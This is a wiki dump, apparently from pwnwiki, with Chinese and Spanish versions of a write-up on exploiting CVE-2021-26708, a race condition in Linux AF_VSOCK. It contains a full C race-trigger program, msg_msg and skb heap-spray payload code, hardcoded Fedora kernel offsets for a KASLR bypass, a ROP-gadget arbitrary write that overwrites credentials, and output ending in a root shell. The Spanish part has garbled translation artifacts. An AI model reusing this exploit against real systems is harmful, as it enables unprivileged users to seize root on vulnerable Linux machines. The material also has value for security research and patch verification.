mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>b3eedc47wme73o9ec2rophrpg6obkx9</sha1>
    </revision>
    <revision>
      <id>2360</id>
      <parentid>2316</parentid>
      <timestamp>2021-05-05T05:54:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "La creación de sockets &lt;code&gt;AF_VSOCK&lt;/code&gt; está disponible para los usuarios sin privilegios y no requiere espacio de nombre de usuario."</comment>
      <origin>2360</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="26772" sha1="nauen8lbmq970r7omx2g1xvzv0p1tlo" xml:space="preserve">&lt;languages  /&gt;
Vulnerabilidad

Estas vulnerabilidades son causadas por la contención condicional provocada por un falso bloqueo en &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. Estas contenciones de condiciones se introdujeron implícitamente en el commit de noviembre de 2019 que añadió el soporte de multitransferencia VSOCK y se fusionaron en la versión 5.5-rc1 del kernel de Linux.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; y &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; se proporcionan como módulos del núcleo en todas las principales distribuciones de GNU/Linux. Estos módulos vulnerables se cargan automáticamente cuando se crea un socket para el dominio AF_VSOCK.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

La creación de sockets &lt;code&gt;AF_VSOCK&lt;/code&gt; está disponible para los usuarios sin privilegios y no requiere espacio de nombre de usuario.


Corrupción de la memoria

A continuación se detalla la explotación de la CVE-2021-26708, que hace uso de la competencia condicional en &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;, la recuperación requiere dos hilos, el primero de los cuales llama a &lt;code&gt;setsockopt()&lt;/code&gt;.
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



El segundo hilo cambia el transporte del socket virtual cuando &lt;código&gt;vsock_stream_etssockopt()&lt;/código&gt; intenta obtener un bloqueo de socket, lo que se consigue reconectando el socket virtual a.
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Para manejar &lt;code&gt;connect()&lt;/code&gt; para sockets virtuales, el kernel ejecuta &lt;code&gt;vsock_stream_connect()&lt;/code&gt; que llama a &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. Esta función contiene el siguiente código.
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;código&gt;vsock_stream_connect()&lt;/código&gt; contiene el bloqueo del socket, y &lt;código&gt;vsock_stream_setsockopt()&lt;/código&gt; en el hilo paralelo también intenta obtenerlo, constituyendo una competencia condicional. Como resultado, la función &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; es llamada cuando se realiza una segunda &lt;code&gt;connect()&lt;/code&gt; con un &lt;code&gt;svm_cid&lt;/code&gt; diferente. La función ejecuta &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, liberando &lt;code&gt;vsock_sock.trans&lt;/code&gt;, y &lt;code&gt;vsk-&gt;transport&lt;/code&gt; se establece en NULL. cuando &lt;code&gt;vsock_ stream_connect()&lt;/code&gt; libera el bloqueo del socket, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; puede seguir ejecutándose. Llama a &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, seguido de &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Aquí el transporte contiene un valor obsoleto de una variable local que no coincide con &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (la causa se establece en NULL).

El núcleo ejecuta &lt;código&gt;virtio_transport_notify_buffer_size()&lt;/código&gt; con corrupción de memoria.
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Aquí, el vvs es un puntero a la memoria del núcleo, que ha sido liberado en &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. La &lt;code&gt;estructura virtio_vsock_sock&lt;/code&gt; tiene un tamaño de 64 bytes y se encuentra en la caché de bloques kmalloc-64. El tipo de campo buf_alloc es u32, ubicado en el offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE es 0xFFFFFFUL&lt;/code&gt;. El valor de *val es controlado por el atacante, y sus cuatro bytes menos significativos se escriben en la memoria liberada.


Prueba difusa

El fuzzer syzkaller no tiene forma de reproducir este bloqueo, así que decidí estudiarlo yo mismo. Pero, ¿por qué falla el fuzzer? Observe &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; y descubra:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Solo cuando val sea diferente del actual buffer_size, se llamará a &lt;code&gt; notify_buffer_size () &lt;/code&gt;, es decir, cuando &lt;code&gt; setsockopt () &lt;/code&gt; ejecute &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, cada vez Los parámetros de tamaño de la llamada deben ser todos diferentes. Entonces construí el código relevante:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

El valor de tamaño aquí se toma del número de nanosegundos devueltos por &lt;code&gt; clock_gettime () &lt;/code&gt;, que puede ser diferente cada vez. El syzkaller original no hace esto, porque cuando syzkaller genera una entrada fuzzing, el valor del parámetro syscall está determinado y no cambiará durante la ejecución.

== El poder de cuatro bytes ==

Aquí elijo Fedora 33 Server como el objetivo de la investigación, la versión del kernel es 5.10.11-200.fc33.x86_64, y estoy decidido a omitir SMEP y SMAP.

En el primer paso, comencé a estudiar la pulverización de pila estable, que explotaba la ejecución de las actividades del espacio del usuario para hacer que el kernel asignara otro objeto de 64 bytes en la ubicación del virtio_vsock_sock liberado. Después de varios intentos experimentales, se confirmó que el virtio_vsock_sock publicado se sobrescribió, lo que indica que la fumigación en pilas es factible. Finalmente encontré msgsnd () syscall. Crea struct msg_msg en el espacio del kernel, vea la salida de pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

El anverso es el encabezado del mensaje y el reverso son los datos del mensaje. Si la estructura msgbuf en el espacio de usuario tiene un mtext de 16 bytes, se creará el correspondiente msg_msg en la caché del bloque kmalloc-64. Una escritura libre de 4 bytes destruirá el puntero de seguridad void * en el desplazamiento 40. El campo msg_msg.security apunta a los datos del kernel asignados por lsm_msg_msg_alloc (). Cuando se reciba msg_msg, será liberado por security_msg_msg_free (). Por lo tanto, al destruir la primera mitad del puntero de seguridad, se puede obtener una libertad arbitraria.

== Fuga de información del kernel ==

Aquí se utiliza [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D % 87% E6% BC% 8F% E6% B4% 9E CVE-2019-18683] la misma técnica. El segundo connect () del socket virtual llama a &lt;code&gt; vsock_deassign_transport () &lt;/code&gt; y establece &lt;code&gt; vsk-&gt; transport &lt;/code&gt; en NULL, haciendo que &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Calling &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; después de la caída de la memoria, aparece una advertencia del kernel:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
A través de la depuración de gdb, se encuentra que el registro RCX contiene la dirección del kernel del virtio_vsock_sock liberado, y el registro RBX contiene la dirección del kernel de vsock_sock.

== Logra una lectura arbitraria ==

=== De libre arbitrario a usar-después-libre ===

Liberar un objeto de la dirección del kernel filtrada
Realice una pulverización en pila y cubra el objeto con datos controlados
Utilice objetos dañados para la escalada de privilegios
El mensaje System V implementado por el kernel tiene un límite máximo de DATALEN_MSG, es decir, PAGE_SIZE menos sizeof (struct msg_msg)). Si envía un mensaje más grande, los mensajes restantes se guardarán en la lista de segmentos de mensajes. Msg_msg contiene struct msg_msgseg * al lado del primer segmento, y size_t m_ts se usa para almacenar el tamaño. Al realizar una operación de sobrescritura, puede poner el valor controlado en msg_msg.m_ts y msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Pero, ¿cómo usar msg_msg para leer datos del kernel? Al leer la documentación de la llamada al sistema msgrcv (), encontré una buena solución, usando msgrcv () y las banderas MSG:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Esta bandera hace que el kernel copie los datos del mensaje en el espacio del usuario sin eliminarlo de la cola de mensajes. Si el kernel tiene CONFIG_CHECKPOINT_RESTORE = y, entonces MSG está disponible y es aplicable en Fedora Server.

=== Pasos de lectura arbitraria ===

Listo para trabajar:
Utilice sched_getaffinity () y CPU_COUNT () para calcular la cantidad de CPU disponibles (se requieren al menos dos para esta vulnerabilidad);
Abra / dev / kmsg para análisis;
